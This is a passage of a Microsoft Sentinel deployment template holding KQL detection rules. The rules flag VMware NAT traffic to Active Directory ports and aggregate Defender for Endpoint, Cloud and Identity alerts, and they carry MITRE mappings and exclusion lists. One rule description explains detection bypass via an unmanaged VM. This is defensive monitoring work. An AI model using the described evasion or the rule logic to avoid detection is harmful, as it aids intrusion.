          "query": "let alert_id = 'BV-11500';\nlet alert_type = 'SOC';\nlet exclude_hash = true;\nlet calculate_hash = false;\nlet max_description_line = 300;\nlet max_description_list_length = 5;\nlet end_time = now();\nlet start_time_historical = 7d;\nlet start_time_suppress = 7d;\nlet global_config = dynamic({\n  'EXCLUSION': dynamic([{}])\n  , 'excluded_dedup_hash_fields': dynamic(['bv_dedup_hash'])\n});\nlet exclusions = array_concat(global_config['EXCLUSION'], dynamic([{}]));\nlet field_filter = array_concat(bv_global_field_filter, dynamic(['bv_src_ip', 'bv_start_time','bv_end_time']));\nlet excluded_description_fields = dynamic(['bv_raw']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']); \nlet ADPorts = dynamic([88, 135, 389, 636, 464, 3268, 3269]); // Common AD-related ports\nlet MinRequiredPorts = floor((0.7 * array_length(ADPorts)), 1); // Minimum required ports\nDeviceNetworkEvents\n| where TimeGenerated > ago(24h)\n| extend RemoteIPType = iif(ipv4_is_private(RemoteIP), \"Private\", \"Public\")\n| where RemoteIPType == \"Private\"\n| where RemotePort in (ADPorts)\n| where InitiatingProcessFileName == 'vmnat.exe' \n    or InitiatingProcessVersionInfoFileDescription == 'VMware NAT Service'\n| summarize StartTime=arg_min(TimeGenerated, *), EndTime=max(TimeGenerated), ConnectionCount=count(), RemotePorts=make_set(RemotePort), RemoteIPs=make_set(RemoteIP) by DeviceId, InitiatingProcessId, InitiatingProcessParentId\n| where array_length(RemotePorts) >= MinRequiredPorts\n| where EndTime > ago(1h)\n// Main Projected fields for description\n// DeviceName, LocalIP, RemoteIPs, RemotePorts\n| extend Parts=split(DeviceName, \".\")\n| extend HostName=tostring(Parts[0]),\n    DnsDomain=array_strcat(array_slice(Parts, 1, array_length(Parts)), \".\")\n| project-away Parts\n| extend bv_dedup_hash = hash_sha1(strcat(LocalIP, DeviceName))\n| where BV_FUN_DEDUP(alert_id, start_time_suppress) !has bv_dedup_hash\n|extend details = strcat('Device name: ', DeviceName, '\\nDevice IP address: ', LocalIP\n    , '\\nRemote IP address(es): ', RemoteIPs, '\\nRemote Port(s): ', RemotePorts)\n| extend bv_alarm_attacker_entities = pack_array(DeviceName), bv_mapping_tag = DeviceName\n| project-keep *",
          "queryFrequency": "PT1H",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "CommandAndControl"
          ],
          "techniques": [
            "T1071"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "P1D",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-11500: [SOC] Alert - Local VM Connection to AD Domain - {{DeviceName}}",
            "alertDescriptionFormat": "A local VM has created multiple connections to AD Domains which could be indicative of potential detection bypass by running tools on an unmanaged virtual machine. Since all connection activity will be routed through the local system via vmnat.exe, the VM will inherit many of the permissions from the host device for the purposes of network traffic.\n\n{{details}}\n\nReview device history to determine if VMWare is common behavior for the device or users of the device. Additionally, review authentication traffic that came through any kerberos based connections captured within the detection (common Kerberos ports include: 88, 135, 389, 464).\n\ntag: SOC\nMITRE: T1071"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "bvtag": "bv_mapping_tag",
            "AttackerEntity": "bv_alarm_attacker_entities"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "LocalIP"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "HostName"
                },
                {
                  "identifier": "DnsDomain",
                  "columnName": "DnsDomain"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-901')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-901')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-901: [RBA] MDE - Microsoft Defender for Endpoint",
          "description": "Microsoft Defender for Endpoint (MDE) alerts (formerly DATP) \n\nExclusion options: \n    * bv_file_name\n    * bv_file_hash\n    * bv_src_user\n    * bv_src_user_id\n    * bv_process\n    * bv_process_command_line\n    * bv_url\n    * bv_src_ip MITRE: T1001,T1006,T1008,T1021,T1027,T1036,T1047,T1053,T1055,T1059,T1070,T1071,T1072,T1078,T1090,T1091,T1092,T1095,T1102,T1104,T1105,T1106,T1112,T1127,T1129,T1132,T1134,T1140,T1197,T1202,T1203,T1204,T1205,T1207,T1210,T1211,T1216,T1218,T1219,T1220,T1221,T1484,T1497,T1542,T1548,T1550,T1553,T1556,T1559,T1562,T1563,T1564,T1568,T1569,T1571,T1572,T1574,T1600,T1601,T1610,T1612 Category: Microsoft Defender XDR tag: RBA",
          "severity": "Medium",
          "enabled": true,
          "query": "let start_time = 10m;\nlet end_time = now(); \nlet latency = 1h;\nlet start_time_historical = 1d;\nlet alert_bin = 10m;\nlet PreviousSOCAlerts = toscalar(SecurityAlert\n    | where TimeGenerated between (ago(start_time_historical) .. now())\n    | where AlertName contains 'BV-900: [SOC]'\n    | extend MDEIncidentId = tostring(parse_json(tostring(parse_json(tostring(parse_json(ExtendedProperties).[\"Custom Details\"])).MDEIncidentID))[0])\n    | summarize MDEIncidentId = make_set(MDEIncidentId)\n    );\nSecurityAlert\n| where TimeGenerated between (ago(latency + start_time) .. end_time) and ingestion_time() > ago(start_time)\n| where ProviderName =~ 'MDATP'\n| where AlertSeverity != 'Informational'\n| summarize arg_max(TimeGenerated, *) by SystemAlertId\n| extend IncidentId = tostring(parse_json(ExtendedProperties).IncidentId)\t\n| extend Blocked = iff(DisplayName has_any ('prevented', 'blocked'), true, false)\n| extend PreviouslyReported = IncidentId in (PreviousSOCAlerts)\n| extend MicrosoftDefenderAtpCategory = tostring(parse_json(ExtendedProperties).[\"MicrosoftDefenderAtp.Category\"])\n, bv_orig_alert_id = SystemAlertId\n| extend ParsedEntities = parse_json(Entities)\n| mv-apply e = ParsedEntities on ( \n    //Parse Files\n    extend File                   = iff(e.Type == 'file', e, '')\n    | extend FileNames            = iff(e.Type == 'file', e.Name, '')\n    | extend FileHashes           = iff(e.Type == 'file', e.FileHashes, '')\n    | mv-apply h                  = todynamic(FileHashes) on (\n        extend MD5                = iff(h.Algorithm == 'MD5', h.Value, '')\n        | extend SHA256           = iff(h.Algorithm == 'SHA256', h.Value, '')\n        )\n    //Parse Account\n    | extend Accounts             = iff(e.Type == 'account', e, '')\n    | extend AccountSID           = iff(e.Type == 'account', e.Sid, '')\n    | extend AccountName          = iff(e.Type == 'account', e.Name, '')\n    | extend AccountUPN           = iff(e.Type == 'account', e.UserPrincipalname, '')\n    //Parse Processes\n    | extend Processes            = iff(e.Type == 'process', e, '')\n    | extend ProcessName          = iff(e.Type == 'process', parse_json(e.ImageFile).Name, '')\n    | extend ProcessCommandLine   = iff(e.Type == 'process', e.CommandLine, '')\n    | extend ProcessHashes        = iff(e.Type == 'process', parse_json(e.ImageFile).FileHashes, '')\n    | mv-apply h                  = todynamic(ProcessHashes) on (\n        extend ProcessMD5=iff(h.Algorithm == 'MD5', h.Value, '')\n        | extend ProcessSHA256=iff(h.Algorithm == 'SHA256', h.Value, '')\n        )\n    //Urls\n    | extend Url                  = iff(e.Type == 'url', e.Url, '')\n    //IPAddress\n    | extend IPAddress            = iff(e.Type == 'ip', e.Address, '')\n    | summarize \n        //Files\n        Files                     = make_set_if(File, isnotempty(File))\n        , bv_file_name            = make_set_if(FileNames, isnotempty(FileNames))\n        , MD5                     = make_set_if(MD5, isnotempty(MD5))\n        , bv_file_hash            = make_set_if(SHA256, isnotempty(SHA256))\n        //Accounts\n        , Accounts                = make_set_if(Accounts, isnotempty(Accounts))\n        , bv_src_user_id          = make_set_if(AccountSID, isnotempty(AccountSID))\n        , bv_src_user_name        = make_set_if(AccountName, isnotempty(AccountName))\n        , bv_src_user             = make_set_if(AccountUPN, isnotempty(AccountUPN))\n        //Processes\n        , Processes               = make_set_if(Processes, isnotempty(Processes))\n        , bv_process              = make_set_if(ProcessName, isnotempty(ProcessName))\n        , bv_process_command_line = make_set_if(ProcessCommandLine, isnotempty(ProcessCommandLine))\n        , ProcessMD5              = make_set_if(ProcessMD5, isnotempty(ProcessMD5))\n        , ProcessSHA256           = make_set_if(ProcessSHA256, isnotempty(ProcessSHA256))\n        //Urls\n        , bv_url                  = make_set_if(Url, isnotempty(Url))\n        //Urls\n        , bv_src_ip               = make_set_if(IPAddress, isnotempty(IPAddress))\n    )\n| mv-apply e = A900_CONFIG on (\n    extend keys = bag_keys(e)\n    | extend key_count                          = iff(keys contains 'metadata', array_length(keys) - 1, array_length(keys))\n    | extend bv_file_name_excluded              = iff(bv_file_name contains e.bv_file_name and isnotempty(e.bv_file_name), 1, 0)\n    | extend bv_file_hash_excluded              = iff(bv_file_hash contains e.bv_file_hash and isnotempty(e.bv_file_hash), 1, 0)\n    | extend bv_src_user_excluded               = iff(bv_src_user contains e.bv_src_user and isnotempty(e.bv_src_user), 1, 0)\n    | extend bv_src_user_id_excluded            = iff(\n                bv_src_user_id contains e.bv_src_user_id and isnotempty(e.bv_src_user_id), 1, 0)\n    | extend bv_process_excluded                = iff(bv_process contains e.bv_process and isnotempty(e.bv_process), 1, 0)\n    | extend bv_process_command_line_excluded   = iff(\n                bv_process_command_line contains e.bv_process_command_line and isnotempty(e.bv_process_command_line), 1, 0\n    )\n    | extend bv_url_excluded                    = iff(bv_url contains e.bv_url and isnotempty(e.bv_url), 1, 0)\n    | extend bv_src_ip_excluded                 = iff(bv_src_ip contains e.bv_src_ip and isnotempty(e.bv_src_ip), 1, 0)\n    | extend excluded_count = \n        bv_file_name_excluded\n        + bv_file_hash_excluded\n        + bv_src_user_excluded\n        + bv_src_user_id_excluded\n        + bv_process_excluded\n        + bv_process_command_line_excluded\n        + bv_url_excluded\n        + bv_src_ip_excluded\n    | extend transparent            = iff(isnotempty(e.metadata[\"transparent\"]), e.metadata[\"transparent\"], true) \n    | extend excluded               = iff(excluded_count == key_count and key_count != 0, true, false)\n    | extend bv_exclusion_reason    = iff(excluded_count == key_count and key_count != 0, parse_json(e.metadata).reason, '')\n    | summarize\n        excluded            = make_set(excluded)\n        , transparent         = countif(transparent)\n        , bv_exclusion_reason = make_set_if(bv_exclusion_reason, isnotempty(bv_exclusion_reason))\n    )\n| extend ExcludedEvent      = iff(excluded contains 'true', true, false)\n| where transparent         != 0\n| extend MitreTechniques_   = tostring(parse_json(ExtendedProperties).MitreTechniques)\n| parse MitreTechniques_  with Technique ';' *\n| project \n    bv_alarm_time           = now()\n    , bv_start_time         = StartTime\n    , bv_end_time           = EndTime\n    , bv_alert_id           = VendorOriginalId\n    , bv_alert_link         = AlertLink\n    , bv_mitre_technique_id = Technique\n    , bv_alert_category     = 'malware'\n    , bv_signature          = AlertName\n    , bv_severity           = AlertSeverity\n    , sourcetype            = 'SecurityAlert'\n    , bv_vendor             = 'Microsoft'\n    , bv_vendor_product     = 'Defender for Endpoint'\n    , bv_src_dvc            = CompromisedEntity\n    , bv_file_hash\n    , bv_file_name\n    , bv_src_ip\n    , bv_src_user\n    , bv_src_user_id\n    , bv_src_user_name\n    , bv_process\n    , bv_process_command_line\n    , bv_url\n    , bv_orig_alert_id\n| extend ExtendedDescription = strcat(\n    'bv_alarm_time: '                       , bv_alarm_time\n    , '\\nbv_start_time: '                   , bv_start_time\n    , '\\nbv_end_time: '                     , bv_end_time\n    , '\\nsourcetype: '                      , sourcetype\n    , '\\nbv_vendor: '                       , bv_vendor\n    , '\\nbv_vendor_product: '               , bv_vendor_product\n    , '\\nbv_signature: '                    , bv_signature\n    , '\\nbv_severity: '                     , bv_severity\n    , '\\nbv_src_dvc: '                      , bv_src_dvc\n    , '\\nbv_orig_alert_id: '                      , bv_orig_alert_id\n    , iff(array_length(bv_src_ip)    > 0,               strcat('\\nbv_src_ip:\\n* '       , strcat_array(bv_src_ip,'\\n* ')), '')\n    , iff(array_length(bv_file_name) > 0,               strcat('\\nbv_file_name:\\n* '    , strcat_array(bv_file_name,'\\n* ')), '')\n    , iff(array_length(bv_file_hash) > 0,               strcat('\\nbv_file_hash:\\n* '    , strcat_array(bv_file_hash,'\\n* ')), '')\n    , iff(array_length(bv_process)   > 0,               strcat('\\nbv_process:\\n* '    , strcat_array(bv_process,'\\n* ')), '')\n    , iff(array_length(bv_process_command_line) > 0,  \n                    strcat('\\nbv_process_command_line:\\n* ', substring(strcat_array(bv_process_command_line,'\\n* '),0,100)), '')\n    , iff(array_length(bv_src_user)  > 0,               strcat('\\nbv_src_user:\\n* '       , strcat_array(bv_src_user,'\\n* ')), '')\n)\n| extend VictimEntity = array_concat(pack_array(bv_src_dvc), bv_src_user)\n| extend AttackerEntity = bv_src_ip\n| extend  bv_src_ip1 = bv_src_ip[0]\n    , bv_file_name1 = bv_file_name[0]\n    , bv_url1 = bv_url[0]\n    , RBAScore = 3\n| extend bv_mapping_tag = bv_src_ip\n| extend bv_rule_version = '1.1.43232'\n| extend bv_rule_timestamp = '1689083049.9152339'\n| project-keep\n    bv_*\n    , ExtendedDescription\n    , AttackerEntity\n    , VictimEntity\n    , RBAScore ",
          "queryFrequency": "PT10M",
          "queryPeriod": "P1D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "InitialAccess",
            "CommandAndControl",
            "Execution",
            "Persistence",
            "PrivilegeEscalation",
            "DefenseEvasion",
            "LateralMovement"
          ],
          "techniques": [
            "T1001",
            "T1006",
            "T1008",
            "T1021",
            "T1027",
            "T1036",
            "T1047",
            "T1053",
            "T1055",
            "T1059",
            "T1070",
            "T1071",
            "T1072",
            "T1078",
            "T1090",
            "T1091",
            "T1092",
            "T1095",
            "T1102",
            "T1104",
            "T1105",
            "T1106",
            "T1112",
            "T1127",
            "T1129",
            "T1132",
            "T1134",
            "T1140",
            "T1197",
            "T1202",
            "T1203",
            "T1204",
            "T1205",
            "T1207",
            "T1210",
            "T1211",
            "T1216",
            "T1218",
            "T1219",
            "T1220",
            "T1221",
            "T1484",
            "T1497",
            "T1542",
            "T1548",
            "T1550",
            "T1553",
            "T1556",
            "T1559",
            "T1562",
            "T1563",
            "T1564",
            "T1568",
            "T1569",
            "T1571",
            "T1572",
            "T1574",
            "T1600",
            "T1601",
            "T1610",
            "T1612"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": false,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-901: [RBA] MDE - {{bv_signature}}",
            "alertDescriptionFormat": "Microsoft Defender for Endpoint (MDE) alerts (formerly DATP)\n\n{{ExtendedDescription}}\n\nMITRE: T1059\nCategory: Defender for Endpoints\ntag: RBA \ntag: v1.5.1\nbv_rule_version: {{bv_rule_version}}\nbv_rule_timestamp: {{bv_rule_timestamp}}",
            "alertSeverityColumnName": "bv_severity"
          },
          "customDetails": {
            "VictimEntity": "VictimEntity",
            "AttackerEntity": "AttackerEntity",
            "RBAScore": "RBAScore",
            "bv_orig_alert_id": "bv_orig_alert_id",
            "VendorOriginalId": "bv_alert_id",
            "MDEIncidentID": "bv_alert_id",
            "bvtag": "bv_mapping_tag"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "bv_src_ip1"
                }
              ]
            },
            {
              "entityType": "Host",
              "fieldMappings": [
                {
                  "identifier": "HostName",
                  "columnName": "bv_src_dvc"
                }
              ]
            },
            {
              "entityType": "URL",
              "fieldMappings": [
                {
                  "identifier": "Url",
                  "columnName": "bv_url1"
                }
              ]
            },
            {
              "entityType": "File",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "bv_file_name1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-920')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-920')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-920: [Dynamic] MDC - Defender for Cloud - Alerts",
          "description": "Defender For Cloud Applications (f.k.a. Azure Security Center)  \n\nReference: https://docs.microsoft.com/en-us/azure/security-center/alerts-reference\n\nInclusions:\nExclusion: A920_EXCLUSIONS - Multi-dimensional based on UserName, HostName, IP, and AlertName MITRE: T1565 Category: Microsoft Defender XDR tag: SOC tag: Dynamic",
          "severity": "High",
          "enabled": true,
          "query": "let start_time = 1h;   \nlet latency= 1h; \nlet end_time = now();\nlet start_time_historical = 7d; \nlet start_time_suppress = 3d;\nlet alert_bin =1h;\nlet alert_id = 'BV-920:';\nlet exclusions = A920_EXCLUSIONS; \nlet PreviousAlerts = toscalar(SecurityAlert\n|where TimeGenerated >= ago(start_time_suppress)\n| where AlertName has 'BV-920'\n      | mv-apply e = parse_json(Entities) on ( \n          extend UserName           = iff(e.Type == 'account', e.Name, '')\n          | extend IPAddress            = iff(e.Type == 'ip', e.Address, '')\n          | summarize \n              bv_user                 = make_set_if(UserName, isnotempty(UserName))\n              , bv_src_ip               = make_set_if(IPAddress, isnotempty(IPAddress))\n)\n| project main = iff(array_length(bv_src_ip) > 0 and bv_src_ip !has '127.0.0.1', bv_src_ip, bv_user)\n| summarize make_set(main));\na920_query \n|extend dd_val = iff(array_length(SrcIPAddress) > 0 and SrcIPAddress !has '127.0.0.1', SrcIPAddress, AccountName)\n| where array_length(set_intersect(PreviousAlerts, dd_val)) == 0\n| extend bv_alarm_victim_entities = pack_array(coalesce(UserName1, SrcIPAddress1, CompromisedEntity))\n| extend bv_dedup_hash = hash_sha1(strcat(tostring(bv_alarm_victim_entities), AlertName))\n|extend bv_signature = AlertName\n| where BV_FUN_DEDUP(alert_id,ago(start_time_suppress)) !has bv_dedup_hash\n| extend bv_rule_version = '1.3.5287'\n| extend bv_rule_timestamp = '1715963204.459629'\n| extend bv_rule_combined_string = 'bv_rule_version: 1.3.5287 bv_rule_timestamp: 1715963204.459629'",
          "queryFrequency": "PT1H",
          "queryPeriod": "P7D",
          "triggerOperator": "GreaterThan",
          "triggerThreshold": 0,
          "suppressionDuration": "PT6H",
          "suppressionEnabled": false,
          "startTimeUtc": null,
          "tactics": [
            "Impact"
          ],
          "techniques": [
            "T1565"
          ],
          "subTechniques": [],
          "alertRuleTemplateName": null,
          "incidentConfiguration": {
            "createIncident": true,
            "groupingConfiguration": {
              "enabled": false,
              "reopenClosedIncident": false,
              "lookbackDuration": "PT1H",
              "matchingMethod": "Selected",
              "groupByEntities": [],
              "groupByAlertDetails": [],
              "groupByCustomDetails": []
            }
          },
          "eventGroupingSettings": {
            "aggregationKind": "AlertPerResult"
          },
          "alertDetailsOverride": {
            "alertDisplayNameFormat": "BV-920: [{{Class}}] MDC - {{AlertName}} for entity {{bv_alarm_victim_entities}}",
            "alertDescriptionFormat": "Defender for Cloud (f.k.a. Azure Security Center)\n\nReference: https://docs.microsoft.com/en-us/azure/security-center/alerts-reference\n\nMITRE: T1565\nCategory: Defender for Cloud\n{{Tags}}\ntag: v2.0.0\n\n{{ExtendedDescription}}\n\nAggregation: CompromisedEntity (Account) \n\nInclusions:\nExclusion: A920_EXCLUSIONS - Multi-dimensional based on UserName, HostName, IP, and AlertName\n{{bv_rule_combined_string}}",
            "alertSeverityColumnName": "Severity"
          },
          "customDetails": {
            "bv_dedup_hash": "bv_dedup_hash",
            "bv_orig_alert_id": "bv_orig_alert_id",
            "VendorIncidentIds": "VendorIncidentIds",
            "VendorAlertIds": "VendorAlertIds"
          },
          "entityMappings": [
            {
              "entityType": "IP",
              "fieldMappings": [
                {
                  "identifier": "Address",
                  "columnName": "SrcIPAddress1"
                }
              ]
            },
            {
              "entityType": "Account",
              "fieldMappings": [
                {
                  "identifier": "Name",
                  "columnName": "UserName1"
                }
              ]
            }
          ],
          "sentinelEntitiesMappings": null,
          "templateVersion": null
        }
      },
      {
        "id": "[concat(resourceId('Microsoft.OperationalInsights/workspaces/providers', parameters('workspace'), 'Microsoft.SecurityInsights'),'/alertRules/BV-940')]",
        "name": "[concat(parameters('workspace'),'/Microsoft.SecurityInsights/BV-940')]",
        "type": "Microsoft.OperationalInsights/workspaces/providers/alertRules",
        "kind": "Scheduled",
        "apiVersion": "2023-12-01-preview",
        "properties": {
          "displayName": "BV-940: [Dynamic] MDI - Microsoft Defender for Identity - Alerts",
          "description": "Creates Incidents from Microsoft Defender for Identity Alerts. MITRE: T1566,T1098,T1559,T1055 Category: Microsoft Defender XDR tag: SOC tag: Dynamic",
          "severity": "High",
          "enabled": true,
          "query": "let alert_id = 'BV-940:';\nlet start_time = 1h;     \nlet end_time = now();\nlet start_time_historical = 3d;\nlet latency = 1d; \nlet calculate_hash = false;      \nlet ExcludedSignatures = dynamic(['Honeytoken was queried via SAM-R', 'Honeytoken was queried via LDAP', 'Suspected identity theft (pass-the-ticket)']);\nlet global_config = dynamic({\n    'excluded_dedup_hash_fields': dynamic(['bv_start_time', 'bv_start_time', 'bv_alert_id', 'bv_alert_time', 'bv_mitre_technique_id', 'bv_severity', 'bv_signature', 'bv_signature_id', 'bv_vendor_description', 'bv_hist_alert_', 'bv_trust_'])         \n});\nlet excluded_description_fields = dynamic(['bv_vendor_description', 'bv_hist_alert_name1', 'bv_dedup_hash']);\nlet excluded_dedup_fields = array_concat(bv_excluded_dedup_hash_fields, global_config['excluded_dedup_hash_fields']);\nlet rba_score = coalesce(toreal(global_config['RBASCORE']), toreal(A940_EXCLUSION_V2['RBASCORE']),1.0); \nlet threshold = array_concat(global_config['THRESHOLD'], BV940_CONFIG['THRESHOLD'], dynamic([{}]));     \nlet gen_detail_and_hash = (t: (*), ef:dynamic=dynamic([]), mfl:int=300, mal:int=5, efd:dynamic=dynamic([]), dh:boolean=true){\n        t\n        | extend a = pack_all()\n        | extend k = array_sort_asc(bag_keys(a))\n        | mv-apply k to typeof(string) on (\n            extend v = todynamic(tostring(a[k]))\n            | extend v = iff(gettype(v) != 'array', pack_array(v), v)\n            | extend \n                vl = iff(array_length(v) == 1 and isempty(v[0]),0,array_length(v))\n                , vf = k startswith 'bv_' and not (k has_any (efd))\n            | extend vv = vl == 1 \n            | extend \n                df = iff(vf and vv, k, '')\n                , dv = iff(vf and vv, v[0], '')\n            | extend e = iff(k startswith 'bv_' and k != 'bv_raw' and not(k has_any (ef)), strcat(\n                case(vl > 1 , strcat(k, ': \\n* ', substring(strcat_array(array_slice(v,0,(mal-1)),'\\n* '),0,mfl), '\\n')\n                , vl == 1, strcat(k,': ', v[0])\n                , '')\n                ),'')\n                | summarize \n                    e = make_set(e)\n                    , bv_dedup_fields = make_set_if(df, isnotempty(df))\n                    , bv_dedup_values = make_set_if(dv, isnotempty(dv))\n        )\n        | extend \n            ExtendedDescription=strcat_array(e, '\\n ')\n            , bv_dedup_hash = columnifexists('bv_dedup_hash', '')\n        | extend bv_dedup_hash = iff(dh,hash_sha1(strcat_array(bv_dedup_values,'')),bv_dedup_hash)\n  };\nlet DeviceDetails = materialize(union isfuzzy=true\n(SigninLogs\n| where TimeGenerated >= ago(start_time_historical)\n| project DeviceDetail\n| extend trustType = tostring(DeviceDetail.trustType)\n| extend isManaged = tostring(DeviceDetail.isManaged)\n| extend HostName = tolower(DeviceDetail.displayName)\n| extend trustType = case(trustType has 'Hybrid', 'Hybrid AAD Joined', trustType has 'Domain Joined', 'Domain Joined', trustType has 'Azure AD joined', 'AAD Joined', trustType has 'Azure AD registered', 'AAD Registered', '')\n),\n(DeviceInfo\n| where TimeGenerated >= ago(start_time_historical)\n| extend trustType = case(JoinType has 'Hybrid', 'Hybrid AAD Joined', JoinType has 'Domain Joined', 'Domain Joined', JoinType has 'AAD Joined', 'AAD Joined', JoinType has 'AAD Registered', 'AAD Registered', '')\n| parse DeviceName with HostName '.' *\n| project trustType, HostName\n)\n| extend trustType = iff(isnotempty(trustType), strcat(HostName, ' [', trustType, ']'), '')\n| summarize trustType = make_set_if(trustType, isnotempty(trustType)) by trustedHost=HostName\n);\nlet Alerts = materialize(SecurityAlert\n    | where TimeGenerated between (ago(start_time_historical) .. end_time)\n    | where ProductName =~ 'Azure Advanced Threat Protection'\n//Extract out attacker, Microsoft did not map hosts in entities\n    | parse Description with * ' from ' AttackerHost1 ', ' *\n    | parse Description with * ' on ' AttackerHost2 ' sent' *\n    | parse Description with * ' sent' * ' to ' AttackerHost3\n    | parse Description with * ' ' AttackerHost4 ' sent' *\n    | extend AttackerHost = coalesce(AttackerHost1, AttackerHost2, AttackerHost3, AttackerHost4)    \n            , bv_orig_alert_id = SystemAlertId\n    | extend ParsedEntities = parse_json(Entities)\n        , UniqueExternalId = tostring(parse_json(ExtendedProperties).UniqueExternalId)\n    | lookup bv_940_alert_type_with_id on AlertType\n    | extend UniqueExternalId = coalesce(UniqueExternalId, UniqueExternalId1)    \n    | mv-apply entity = ParsedEntities on (\n    extend Host = iif(entity.Type =~ 'host', strcat(entity.HostName, '@',entity.DnsDomain), '')\n    | extend HostName = iff(entity.Type =~ 'host', entity.HostName,'')\n    | extend AccountName = iif(entity.Type =~ 'account', entity.Name, '')\n    | extend CommandLine = iif(entity.Type =~ 'ServiceInfo', entity.Command, '')\n    | summarize\n        Host=make_set_if(Host, isnotempty(Host))\n        , HostName=make_set_if(HostName, isnotempty(HostName))\n        , AccountName=make_set_if(AccountName, isnotempty(AccountName))\n        , CommandLine = make_set_if(CommandLine,isnotempty(CommandLine))\n));\nlet Prev940Alert = materialize(SecurityAlert\n| where TimeGenerated >= ago(1d)\n| where AlertName has 'BV-940'\n| project AlertName, ExtendedProperties, Entities);\nlet AssociatedEnt = Prev940Alert\n| extend custom_details =todynamic(tostring(todynamic(ExtendedProperties)['Custom Details']))\n| extend\n    VE = todynamic(tostring(todynamic(tostring(custom_details.VictimEntity))[0]))\n    , AE = todynamic(tostring(todynamic(tostring(custom_details.AttackerEntity))[0]))\n| extend VAE = array_concat(AE, VE)\n| mv-expand ent=VAE to typeof(string)\n| summarize bv_hist_alert_name = make_set(AlertName, 5) by ent=tolower(ent);\n//Get Previously report MDI events for future exclusion\nlet PreviousAlerts = toscalar(SecurityAlert\n    | where TimeGenerated > ago(1d)\n    |where AlertName contains 'bv-940:'\n|parse Description with * 'SystemAlertId == \"' original_alert_id '\"' *\n| summarize make_set_if(original_alert_id, isnotempty(original_alert_id)));\nlet Prev940Host = toscalar(Prev940Alert\n| extend custom_details =todynamic(tostring(todynamic(ExtendedProperties)['Custom Details']))\n| extend\n    VE = todynamic(tostring(todynamic(tostring(custom_details.VictimEntity))[0]))\n    , AE = todynamic(tostring(todynamic(tostring(custom_details.AttackerEntity))[0]))\n      | mv-apply e = parse_json(Entities) on ( \n          extend UserName           = iff(e.Type == 'account', e.Name, '')\n          | extend HostName            = iff(e.Type == 'host', e.HostName, '')\n          | summarize \n              bv_user                 = make_set_if(UserName, isnotempty(UserName))\n              , bv_src_dvc              = make_set_if(HostName, isnotempty(HostName))\n)\n| project main = iff(array_length(bv_src_dvc) > 0, bv_src_dvc, bv_user), AE\n| summarize make_set(array_concat(main, AE)));                \nAlerts\n|where TimeGenerated between (ago(start_time) .. end_time)\n//Take latest event update by VendorOriginalId\n| summarize arg_max(TimeGenerated, *) by VendorOriginalId\n//Remove any events that started more than the latency\n//Some events do not generate a Sentinel Alert past the latency after StartTime\n| extend TimeGeneratedStartTimeDifference = TimeGenerated - StartTime\n| where TimeGeneratedStartTimeDifference < latency\n//Remove previously seen alerts in start_time_historical timeframe\n| where SystemAlertId !in (PreviousAlerts)\n| extend dd_val = iff(array_length(HostName) > 0, HostName, AccountName)\n| parse Host[0] with HostName1 '@' HostDNSDomain1\n| parse Host[1] with HostName2 '@' HostDNSDomain2\n| extend UserName = AccountName[0]\n, HostName1 = tolower(HostName1)\n, HostName2 = tolower(HostName2)             \n| extend bv_src_dvc = coalesce(AttackerHost, HostName1, HostName2)    \n| extend bv_dedup_hash = hash_sha1(strcat(AlertName,tostring(bv_src_dvc)))        \n| where array_length(set_intersect(Prev940Host, dd_val)) == 0 and BV_FUN_DEDUP(alert_id, start_time_historical) !has bv_dedup_hash  \n| extend \n    bv_signature = AlertName\n    , bv_start_time = StartTime\n    , bv_alert_time = TimeGenerated\n    , bv_signature_id = AlertType\n    , bv_mitre_technique_id = Techniques\n    , bv_vendor_description = Description\n    , bv_alert_id = SystemAlertId\n    , bv_severity = AlertSeverity\n    , bv_process_command_line = CommandLine\n    , bv_src_host = AttackerHost\n    , bv_host = HostName\n    , bv_src_user 